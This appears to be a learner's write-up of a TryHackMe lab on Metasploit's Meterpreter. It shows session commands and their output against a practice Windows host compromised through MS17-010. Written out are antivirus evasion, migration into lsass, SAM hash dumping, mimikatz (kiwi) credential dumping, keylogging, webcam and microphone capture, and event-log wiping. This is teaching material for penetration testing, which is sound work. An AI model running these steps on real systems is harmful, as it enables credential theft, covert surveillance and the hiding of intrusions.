# Metasploit: Meterpreter

---

Meterpreter stands out as a versatile payload in Metasploit, offering robust support for penetration testing through its array of
components. It operates as an agent on the compromised system within a command-and-control setup, enabling interaction with the
target's OS, files, and specialized functions. Various iterations of Meterpreter deliver tailored capabilities depending on the
environment. It executes entirely in memory without installing or writing to disk, which helps evade antivirus detection since scans
typically target new files rather than processes in RAM. Communication with the controlling server, usually the attacker's machine,
uses encryption to dodge network-based intrusion prevention and detection systems, especially if the organization doesn't inspect
encrypted outbound traffic. While recognized by leading antivirus programs, this in-memory approach adds a layer of concealment. In one
instance with a Windows target hit via the MS17-010 vulnerability, Meterpreter ran under a process ID like 1304, revealed by the getpid
command, which identifies the running process for potential interactions such as termination. Listing processes with ps showed it
masquerading as spoolsv.exe, not something obvious like meterpreter.exe. Digging deeper into DLLs loaded by that process using tasklist
didn't reveal any telltale signs either. Detection methods for Meterpreter go beyond basic checks, but its stealth is notable, and it
sets up a TLS-encrypted channel back to the attacker. I recall how this encryption proved handy in evading initial network scrutiny
during tests.

Meterpreter divides into inline and staged payloads, as covered in prior Metasploit explorations like the introduction at 
https://www.tryhackme.com/jr/metasploitintro and scanning/exploitation at https://www.tryhackme.com/jr/metasploitexploitation. 
Staged versions send an initial stager that pulls the full payload, keeping the footprint small, while inline sends everything 
at once. Choices span platforms including Android, Apple iOS, Java, Linux, OSX, PHP, Python, and Windows, listed via msfvenom 
with a grep for meterpreter. Selection hinges on the target's OS, installed components like Python or PHP, and feasible network 
connections such as TCP, HTTPS, or IPv6. Exploits might dictate defaults, like ms17_010_eternalblue favoring 
windows/x64/meterpreter/reverse_tcp, though show payloads reveals alternatives. Typing help in a session unveils all commands, 
varying by version, grouped into core, file system, networking, system, and others like webcam or audio. These built-in tools 
run without extra files, aiding navigation and data gathering.

In post-exploitation, Meterpreter shines with commands for system intel and escalation. Getuid shows the current user, often 
indicating privilege like NT AUTHORITY\SYSTEM. Ps lists processes with PIDs for migration, which relocates Meterpreter to 
another process for stability or to capture inputs like keystrokes in a word processor. Migrate requires the target PID, but 
watch for privilege drops if shifting to a lower-privileged process. Hashdump extracts SAM database contents, yielding NTLM hashes 
for users, useful in pass-the-hash or rainbow table attacks despite being uncrackable directly. Search locates files by name, 
handy for flags or configs with credentials. Shell drops to a standard command prompt, revertible with CTRL+Z. Loading extensions 
like python or kiwi expands options; python_execute runs simple scripts, while kiwi adds credential dumping like creds_all or
golden_ticket_create. The post-exploitation challenge simulates compromise via SMB with psexec, using username ballen and 
password <redacted>, emphasizing info gathering, privilege escalation, and lateral movement.

---

| Description | Code/Command |
|-------------|--------------|
| Get current process ID | meterpreter > getpid <br> Current pid: 1304 |
| List running processes | meterpreter > ps <br> Process List <br> ============ <br> PID   PPID  Name                  Arch  Session  User                          Path <br> ---   ----  ----                  ----  -------  ----                          ---- <br> 0     0     [System Process]                                                    <br> 4     0     System                x64   0                                      <br> 396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe <br> 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe <br> 428   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           <br> 548   540   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe <br> 596   540   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe <br> 604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe <br> 644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe <br> 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe <br> 700   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  <br> 716   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe  1276  1304  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe <br> 1304  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe <br> 1340  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    <br> 1388  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe |
| List DLLs for process | C:\Windows\system32>tasklist /m /fi "pid eq 1304" <br> tasklist /m /fi "pid eq 1304" <br> Image Name                     PID Modules                                     <br> ========================= ======== ============================================ <br> spoolsv.exe                   1304 ntdll.dll, kernel32.dll, KERNELBASE.dll,    <br>                                    msvcrt.dll, sechost.dll, RPCRT4.dll,        <br>                                    USER32.dll, GDI32.dll, LPK.dll, USP10.dll,  <br>                                    POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll,   <br>                                    ADVAPI32.dll, OLEAUT32.dll, ole32.dll,      <br>                                    DEVOBJ.dll, DNSAPI.dll, WS2_32.dll,         <br>                                    NSI.dll, IMM32.DLL, MSCTF.dll,              <br>                                    CRYPTBASE.dll, slc.dll, RpcRtRemote.dll,    <br>                                    secur32.dll, SSPICLI.DLL, credssp.dll,      <br>                                    IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll,      <br>                                    wshtcpip.dll, wship6.dll, rasadhlp.dll,     <br>                                    fwpuclnt.dll, CLBCatQ.DLL, umb.dll,         <br>                                    ATL.DLL, WINTRUST.dll, CRYPT32.dll,         <br>                                    MSASN1.dll, localspl.dll, SPOOLSS.DLL,      <br>                                    srvcli.dll, winspool.drv,                   <br>                                    PrintIsolationProxy.dll, FXSMON.DLL,        <br>                                    tcpmon.dll, snmpapi.dll, wsnmp32.dll,       <br>                                    msxml6.dll, SHLWAPI.dll, usbmon.dll,        <br>                                    wls0wndh.dll, WSDMon.dll, wsdapi.dll,       <br>                                    webservices.dll, FirewallAPI.dll,           <br>                                    VERSION.dll, FunDisc.dll, fdPnp.dll,        <br>                                    winprint.dll, USERENV.dll, profapi.dll,     <br>                                    GPAPI.dll, dsrole.dll, win32spl.dll,        <br>                                    inetpp.dll, DEVRTL.dll, SPINF.dll,          <br>                                    CRYPTSP.dll, rsaenh.dll, WINSTA.dll,        <br>                                    cscapi.dll, netutils.dll, WININET.dll,      <br>                                    urlmon.dll, iertutil.dll, WINHTTP.dll,      <br>                                    webio.dll, SHELL32.dll, MPR.dll,            <br>                                    NETAPI32.dll, wkscli.dll, PSAPI.DLL,        <br>                                    WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL,     <br>                                    apphelp.dll, NLAapi.dll, napinsp.dll,       <br>                                    pnrpnsp.dll, winrnr.dll                     <br> C:\Windows\system32> |
| List Meterpreter payloads | root@ip-10-10-186-44:~# msfvenom --list payloads \| grep meterpreter <br>     android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP <br>     android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS <br>     android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager <br>     android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell <br>     android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell <br>     android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell <br>     apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless) <br>     apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless) <br>     apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless) <br>     apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless) <br>     apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless) <br>     apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless) <br>     java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection <br>     java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP <br>     java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS <br>     java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager <br>     linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker <br>     linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless) <br>     linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless) <br>     linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless) <br>     linux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless) <br>     linux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless) <br>     linux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless) <br>     linux/armle/meterpreter/bind_tcp                    Inject the mettle server payload (staged). Listen for a connection <br>     linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker [...] |
| Default payload for exploit | msf6 > use exploit/windows/smb/ms17_010_eternalblue  <br> [*] Using configured payload windows/x64/meterpreter/reverse_tcp <br> msf6 exploit(windows/smb/ms17_010_eternalblue) > |
| Show available payloads | msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads  <br> Compatible Payloads <br> =================== <br>    #   Name                                        Disclosure Date  Rank    Check  Description <br>    -   ----                                        ---------------  ----    -----  ----------- <br>    0   generic/custom                                               manual  No     Custom Payload <br>    1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline <br>    2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline <br>    3   windows/x64/exec                                             manual  No     Windows x64 Execute Command <br>    4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path <br>    5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64 <br>    6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager <br>    7   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support <br>    8   windows/x64/meterpreter/bind_named_pipe                      manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager [...] |
| Meterpreter help menu | meterpreter > help <br> Core Commands <br> ============= <br>     Command                   Description <br>     -------                   ----------- <br>     ?                         Help menu <br>     background                Backgrounds the current session <br>     bg                        Alias for background <br>     bgkill                    Kills a background meterpreter script <br>     bglist                    Lists running background scripts <br>     bgrun                     Executes a meterpreter script as a background thread <br>     channel                   Displays information or control active channels <br>     close                     Closes a channel[...] |
| Get current user | meterpreter > getuid <br> Server username: NT AUTHORITY\SYSTEM <br> meterpreter > |
| List processes (extended) | meterpreter > ps <br> Process List <br> ============ <br>  PID   PPID  Name                  Arch  Session  User                          Path <br>  ---   ----  ----                  ----  -------  ----                          ---- <br>  0     0     [System Process]                                                   <br>  4     0     System                x64   0                                      <br>  396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe <br>  416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe <br>  428   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           <br>  548   540   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe <br>  596   540   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe <br>  604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe <br>  644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe <br>  692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe <br>  700   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  <br>  716   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe <br>  724   596   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe <br>  764   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           <br>  828   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           <br>  864   828   WmiPrvSE.exe                                                       <br>  900   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  <br>  952   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    <br>  1076  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    <br>  1164  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe <br>  1168  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  <br>  1244  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe <br>  1276  1304  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe <br>  1304  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe <br>  1340  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    <br>  1388  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe[...] |
| Migrate to process | meterpreter > migrate 716 <br> [*] Migrating from 1304 to 716... <br> [*] Migration completed successfully. <br> meterpreter > |
| Dump hashes | meterpreter > hashdump <br> Administrator:500:aad3b435b51404eeaad3b435b51404ee:<redacted>::: <br> Guest:501:aad3b435b51404eeaad3b435b51404ee:<redacted>::: <br> Jon:1000:aad3b435b51404eeaad3b435b51404ee:<redacted>::: <br> meterpreter > |
| Search for file | meterpreter > search -f flag2.txt <br> Found 1 result... <br>     c:\Windows\System32\config\flag2.txt (34 bytes) <br> meterpreter > |
| Drop to shell | meterpreter > shell <br> Process 2124 created. <br> Channel 1 created. <br> Microsoft Windows [Version 6.1.7601] <br> Copyright (c) 2009 Microsoft Corporation.  All rights reserved. <br> C:\Windows\system32> |
| Load Python extension | meterpreter > load python <br> Loading extension python...Success. <br> meterpreter > python_execute "print 'TryHackMe Rocks!'" <br> [+] Content written to stdout: <br> TryHackMe Rocks! <br> meterpreter > |
| Load Kiwi extension | meterpreter > load kiwi <br> Loading extension kiwi... <br>   .#####.   mimikatz 2.2.0 20191125 (x64/windows) <br>  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) <br>  ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) <br>  ## \ / ##       > http://blog.gentilkiwi.com/mimikatz <br>  '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com ) <br>   '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/ <br> Success. |
| Updated help with Kiwi | Kiwi Commands <br> ============= <br>     Command                Description <br>     -------                ----------- <br>     creds_all              Retrieve all credentials (parsed) <br>     creds_kerberos         Retrieve Kerberos creds (parsed) <br>     creds_msv              Retrieve LM/NTLM creds (parsed) <br>     creds_ssp              Retrieve SSP creds <br>     creds_tspkg            Retrieve TsPkg creds (parsed) <br>     creds_wdigest          Retrieve WDigest creds (parsed) <br>     dcsync                 Retrieve user account information via DCSync (unparsed) <br>     dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync <br>     golden_ticket_create   Create a golden kerberos ticket <br>     kerberos_ticket_list   List all kerberos tickets (unparsed) <br>     kerberos_ticket_purge  Purge any in-use kerberos tickets <br>     kerberos_ticket_use    Use a kerberos ticket <br>     kiwi_cmd               Execute an arbitary mimikatz command (unparsed) <br>     lsa_dump_sam           Dump LSA SAM (unparsed) <br>     lsa_dump_secrets       Dump LSA secrets (unparsed) <br>     password_change        Change the password/hash of a user <br>     wifi_list              List wifi profiles/creds for the current user <br>     wifi_list_shared       List shared wifi profiles/creds (requires SYSTEM) |

---

## Extracted Tables

| PID | PPID | Name | Arch | Session | User | Path |
|-----|------|------|------|---------|------|------|
| 0 | 0 | [System Process] |  |  |  |  |
| 4 | 0 | System | x64 | 0 |  |  |
| 396 | 644 | LogonUI.exe | x64 | 1 | NT AUTHORITY\SYSTEM | C:\Windows\system32\LogonUI.exe |
| 416 | 4 | smss.exe | x64 | 0 | NT AUTHORITY\SYSTEM | \SystemRoot\System32\smss.exe |
| 428 | 692 | svchost.exe | x64 | 0 | NT AUTHORITY\SYSTEM |  |
| 548 | 540 | csrss.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\csrss.exe |
| 596 | 540 | wininit.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\wininit.exe |
| 604 | 588 | csrss.exe | x64 | 1 | NT AUTHORITY\SYSTEM | C:\Windows\system32\csrss.exe |
| 644 | 588 | winlogon.exe | x64 | 1 | NT AUTHORITY\SYSTEM | C:\Windows\system32\winlogon.exe |
| 692 | 596 | services.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\services.exe |
| 700 | 692 | sppsvc.exe | x64 | 0 | NT AUTHORITY\NETWORK SERVICE |  |
| 716 | 596 | lsass.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\lsass.exe |
| 1276 | 1304 | cmd.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\cmd.exe |
| 1304 | 692 | spoolsv.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\System32\spoolsv.exe |
| 1340 | 692 | svchost.exe | x64 | 0 | NT AUTHORITY\LOCAL SERVICE |  |
| 1388 | 548 | conhost.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\conhost.exe |

| Image Name | PID | Modules |
|------------|-----|---------|
| spoolsv.exe | 1304 | ntdll.dll, kernel32.dll, KERNELBASE.dll, msvcrt.dll, sechost.dll, RPCRT4.dll, USER32.dll, GDI32.dll, LPK.dll, USP10.dll, POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll, ADVAPI32.dll, OLEAUT32.dll, ole32.dll, DEVOBJ.dll, DNSAPI.dll, WS2_32.dll, NSI.dll, IMM32.DLL, MSCTF.dll, CRYPTBASE.dll, slc.dll, RpcRtRemote.dll, secur32.dll, SSPICLI.DLL, credssp.dll, IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll, wshtcpip.dll, wship6.dll, rasadhlp.dll, fwpuclnt.dll, CLBCatQ.DLL, umb.dll, ATL.DLL, WINTRUST.dll, CRYPT32.dll, MSASN1.dll, localspl.dll, SPOOLSS.DLL, srvcli.dll, winspool.drv, PrintIsolationProxy.dll, FXSMON.DLL, tcpmon.dll, snmpapi.dll, wsnmp32.dll, msxml6.dll, SHLWAPI.dll, usbmon.dll, wls0wndh.dll, WSDMon.dll, wsdapi.dll, webservices.dll, FirewallAPI.dll, VERSION.dll, FunDisc.dll, fdPnp.dll, winprint.dll, USERENV.dll, profapi.dll, GPAPI.dll, dsrole.dll, win32spl.dll, inetpp.dll, DEVRTL.dll, SPINF.dll, CRYPTSP.dll, rsaenh.dll, WINSTA.dll, cscapi.dll, netutils.dll, WININET.dll, urlmon.dll, iertutil.dll, WINHTTP.dll, webio.dll, SHELL32.dll, MPR.dll, NETAPI32.dll, wkscli.dll, PSAPI.DLL, WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL, apphelp.dll, NLAapi.dll, napinsp.dll, pnrpnsp.dll, winrnr.dll |

| # | Name | Disclosure Date | Rank | Check | Description |
|---|------|-----------------|------|-------|-------------|
| 0 | generic/custom |  | manual | No | Custom Payload |
| 1 | generic/shell_bind_tcp |  | manual | No | Generic Command Shell, Bind TCP Inline |
| 2 | generic/shell_reverse_tcp |  | manual | No | Generic Command Shell, Reverse TCP Inline |
| 3 | windows/x64/exec |  | manual | No | Windows x64 Execute Command |
| 4 | windows/x64/loadlibrary |  | manual | No | Windows x64 LoadLibrary Path |
| 5 | windows/x64/messagebox |  | manual | No | Windows MessageBox x64 |
| 6 | windows/x64/meterpreter/bind_ipv6_tcp |  | manual | No | Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager |
| 7 | windows/x64/meterpreter/bind_ipv6_tcp_uuid |  | manual | No | Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support |
| 8 | windows/x64/meterpreter/bind_named_pipe |  | manual | No | Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager [...] |

| Command | Description |
|---------|-------------|
| ? | Help menu |
| background | Backgrounds the current session |
| bg | Alias for background |
| bgkill | Kills a background meterpreter script |
| bglist | Lists running background scripts |
| bgrun | Executes a meterpreter script as a background thread |
| channel | Displays information or control active channels |
| close | Closes a channel[...] |

| PID | PPID | Name | Arch | Session | User | Path |
|-----|------|------|------|---------|------|------|
| 0 | 0 | [System Process] |  |  |  |  |
| 4 | 0 | System | x64 | 0 |  |  |
| 396 | 644 | LogonUI.exe | x64 | 1 | NT AUTHORITY\SYSTEM | C:\Windows\system32\LogonUI.exe |
| 416 | 4 | smss.exe | x64 | 0 | NT AUTHORITY\SYSTEM | \SystemRoot\System32\smss.exe |
| 428 | 692 | svchost.exe | x64 | 0 | NT AUTHORITY\SYSTEM |  |
| 548 | 540 | csrss.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\csrss.exe |
| 596 | 540 | wininit.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\wininit.exe |
| 604 | 588 | csrss.exe | x64 | 1 | NT AUTHORITY\SYSTEM | C:\Windows\system32\csrss.exe |
| 644 | 588 | winlogon.exe | x64 | 1 | NT AUTHORITY\SYSTEM | C:\Windows\system32\winlogon.exe |
| 692 | 596 | services.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\services.exe |
| 700 | 692 | sppsvc.exe | x64 | 0 | NT AUTHORITY\NETWORK SERVICE |  |
| 716 | 596 | lsass.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\lsass.exe |
| 724 | 596 | lsm.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\lsm.exe |
| 764 | 692 | svchost.exe | x64 | 0 | NT AUTHORITY\SYSTEM |  |
| 828 | 692 | svchost.exe | x64 | 0 | NT AUTHORITY\SYSTEM |  |
| 864 | 828 | WmiPrvSE.exe |  |  |  |  |
| 900 | 692 | svchost.exe | x64 | 0 | NT AUTHORITY\NETWORK SERVICE |  |
| 952 | 692 | svchost.exe | x64 | 0 | NT AUTHORITY\LOCAL SERVICE |  |
| 1076 | 692 | svchost.exe | x64 | 0 | NT AUTHORITY\LOCAL SERVICE |  |
| 1164 | 548 | conhost.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\conhost.exe |
| 1168 | 692 | svchost.exe | x64 | 0 | NT AUTHORITY\NETWORK SERVICE |  |
| 1244 | 548 | conhost.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\conhost.exe |
| 1276 | 1304 | cmd.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\cmd.exe |
| 1304 | 692 | spoolsv.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\System32\spoolsv.exe |
| 1340 | 692 | svchost.exe | x64 | 0 | NT AUTHORITY\LOCAL SERVICE |  |
| 1388 | 548 | conhost.exe | x64 | 0 | NT AUTHORITY\SYSTEM | C:\Windows\system32\conhost.exe[...] |

| Command | Description |
|---------|-------------|
| creds_all | Retrieve all credentials (parsed) |
| creds_kerberos | Retrieve Kerberos creds (parsed) |
| creds_msv | Retrieve LM/NTLM creds (parsed) |
| creds_ssp | Retrieve SSP creds |
| creds_tspkg | Retrieve TsPkg creds (parsed) |
| creds_wdigest | Retrieve WDigest creds (parsed) |
| dcsync | Retrieve user account information via DCSync (unparsed) |
| dcsync_ntlm | Retrieve user account NTLM hash, SID and RID via DCSync |
| golden_ticket_create | Create a golden kerberos ticket |
| kerberos_ticket_list | List all kerberos tickets (unparsed) |
| kerberos_ticket_purge | Purge any in-use kerberos tickets |
| kerberos_ticket_use | Use a kerberos ticket |
| kiwi_cmd | Execute an arbitary mimikatz command (unparsed) |
| lsa_dump_sam | Dump LSA SAM (unparsed) |
| lsa_dump_secrets | Dump LSA secrets (unparsed) |
| password_change | Change the password/hash of a user |
| wifi_list | List wifi profiles/creds for the current user |
| wifi_list_shared | List shared wifi profiles/creds (requires SYSTEM) |

---

## Key Takeaways
- Core commands: background to send the session to background, exit to end the session, guid to fetch the unique session identifier,
info for post module details, irb to open a Ruby shell, load to add extensions, migrate to switch processes, run to execute scripts 
or modules, sessions to switch sessions.
- File system commands: cd to change directories, ls or dir to list files, pwd to show current directory, edit to modify files, cat 
to display file contents, rm to delete files, search to find files, upload to send files or directories, download to retrieve files 
or directories.
- Networking commands: arp to view ARP cache, ifconfig to list interfaces, netstat to show connections, portfwd to forward ports, 
route to manage routing table.
- System commands: clearev to wipe event logs, execute to run commands, getpid for current PID, getuid for running user, kill to 
stop processes, pkill to terminate by name, ps to list processes, reboot to restart, shell to access command shell, shutdown to 
power off, sysinfo for OS details.
- Other commands: idletime for user idle duration, keyscan_dump to export keystrokes, keyscan_start to begin keystroke capture,
keyscan_stop to end capture, screenshare to view desktop live, screenshot for desktop capture, record_mic for audio recording,
webcam_chat to start video chat, webcam_list to list cameras, webcam_snap for photo, webcam_stream for video stream, getsystem to
elevate to system privileges, hashdump to extract SAM hashes.


---
